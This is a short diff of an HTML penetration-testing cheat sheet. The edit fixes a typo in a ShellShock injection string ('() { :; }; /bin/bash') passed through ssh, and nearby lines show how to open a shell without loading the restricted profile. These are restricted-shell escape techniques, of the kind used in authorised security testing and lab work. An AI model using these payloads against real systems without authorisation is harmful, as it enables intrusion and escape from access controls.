@@ -10,7 +10,7 @@ Start remote shell without loading the "rc" profile (where most limitations are 
 &nbsp;&#09;ssh &lt;RHOST&gt;@&lt;RHOST&gt; -t "bash --noprofile"<br/>
 <br/>
 Try ShellShock on vulnerable shell implementations<br/>
-&nbsp;&#09;ssh &lt;RHOST&gt;@&lt;RHOST&gt; -t "() P :; }; /bin/bash"<br/>
+&nbsp;&#09;ssh &lt;RHOST&gt;@&lt;RHOST&gt; -t "() { :; }; /bin/bash"<br/>
 <br/>
 <br/>
 Sometimes just -T will work<br/>
